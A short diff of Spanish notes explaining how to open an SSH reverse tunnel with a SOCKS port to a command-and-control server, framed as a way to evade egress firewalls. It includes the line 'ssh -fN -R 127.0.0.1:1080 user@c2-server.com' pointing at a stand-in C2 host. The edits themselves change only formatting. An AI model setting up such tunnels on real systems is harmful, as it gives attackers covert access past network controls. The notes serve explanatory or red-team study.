@@ -8,8 +8,7 @@ ssh –fN -R 127.0.0.1:<puerto SOCKS> <usuario>@<dirección IP C2>
 
 -R: Configura un túnel inverso (Reverse Tunnel), donde un puerto en el servidor remoto (C2) es redirigido a tu máquina local.
 
-Estructura del túnel inverso (-R):
-127.0.0.1:<puerto_SOCKS>:
+Estructura del túnel inverso (-R):  127.0.0.1:<puerto_SOCKS>:
 
 127.0.0.1 significa que el túnel estará accesible solo localmente en el servidor C2 (no expuesto externamente a menos que se configure así).
 
@@ -33,9 +32,7 @@ Evitar firewalls: Útil para bypassear restricciones de salida (el túnel se ini
 
 Proxy SOCKS: Si configuras un proxy SOCKS en tu máquina local, el C2 podría usarlo para enrutar tráfico a través de tu conexión.
 
-
 ssh -fN -R 127.0.0.1:1080 user@c2-server.com
-
 
 El C2 (c2-server.com) escuchará en 127.0.0.1:1080 y redirigirá el tráfico a tu máquina local.
 
